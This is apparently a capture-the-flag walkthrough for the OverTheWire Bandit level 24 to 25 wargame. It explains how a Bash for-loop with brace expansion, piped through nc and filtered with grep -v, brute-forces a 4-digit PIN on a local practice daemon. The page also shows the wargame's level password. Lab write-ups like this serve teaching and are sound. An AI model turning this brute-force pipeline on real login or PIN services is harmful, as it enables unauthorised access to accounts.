# 🎯 OverTheWire Bandit: Level 24 ➡️ Level 25

## 📌 Level Overview
* Objective: Brute-force a 4-digit PIN code required by a local daemon to retrieve the next level's credentials.
* Current Access: bandit24
* Target Access: bandit25
* Key Lessons Learned: Bash Automation, For Loops, Brace Expansion, Pipeline Redirection, Persistent Network Connections (`nc`), Output Filtering (`grep`).

---

## 🕵️ The Technical Challenge & Reconnaissance
### Step 1: Discovering the Listening Service
The challenge states that a service (daemon) is listening on localhost port `30002`. We first connect manually to investigate how it interacts with user input:

```Bash
nc localhost 30002
```
- Purpose: To understand the exact expected input format and the error message string returned upon failure.
### Step 2: Code & Protocol Analysis
The daemon expects the current level's password and a secret 4-digit pincode on a single line, separated by a space (e.g., `hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv 1234`).
- If incorrect, it responds with: `Wrong! Please enter the correct current password and pincode. Try again`.
- Crucial Architecture Design: The server explicitly states "You do not need to create new connections each time". This means the socket remains open, allowing us to stream all 10,000 combinations (`0000` to `9999`) continuously through a single network pipeline.
## 🧠 Deep Linux Concepts Investigated
1. Bash One-Liners & Inline Loops
Instead of writing a full script inside a `.sh` file and executing it, the Linux CLI allows us to write a complete iterative loop directly on the prompt using semicolons ; as command separators. The structural syntax follows:
```Bash
for variable in range; do command; done
```
2. Brace Expansion `{0000..9999}`
This is a powerful native mechanism in Bash used to generate arbitrary string sequences. By explicitly padding the range boundaries with zeros (e.g., `0000`), Bash automatically preserves the leading zeros for every generated integer. This is critical because the target daemon enforces a strict 4-digit formatting rule for the PIN.
3. Inverted Matching (`grep -v`)
By default, `grep` extracts and prints lines that match a specified pattern. However, passing the `-v` (invert-match) flag completely reverses this behavior. It instructs the shell to discard any line containing the specified string and only display lines that differ, effectively filtering out bulk automated noise.
## ⚔️ The Exploitation & Injection (Step-by-Step)
### Step 1: Constructing the Payload Generator
We combine the inline `for` loop with brace expansion to generate all 10,000 possibilities dynamically in memory:
```Bash
for i in {0000..9999}; do echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $i"; done
```
- `for i in {0000..9999}`: Spawns an iterative index moving from 0000 up to 9999.
- `do echo "..."`: Prints the current password string followed by a whitespace and the current evaluation index.
- `done`: Terminates the loop boundary execution.
### Step 2: Building the Automated Network Pipeline
We bind the entire stack into a singular Unix pipeline to inject the payload stream and capture the key:
```Bash
for i in {0000..9999}; do echo "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv $i"; done | nc localhost 30002 | grep -v "Wrong"
```
- `| nc localhost 30002`: The first pipe intercepts the 10,000 lines from stdout and feeds them directly into the persistent network socket.
- `| grep -v "Wrong"`: The second pipe intercepts the server's massive response stream, immediately dropping the 9,999 error messages and printing only the line containing the valid flag.
## 🏁 Extraction & Post-Exploitation
We execute the pipeline and wait a few moments for the data stream to finish processing.

Output:
```Plaintext
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is <INSERT_BANDIT25_PASSWORD_HERE>
```
- Result: The plaintext flag for Level 25 is successfully retrieved.
- Note: This password changes from one user instance to another. 
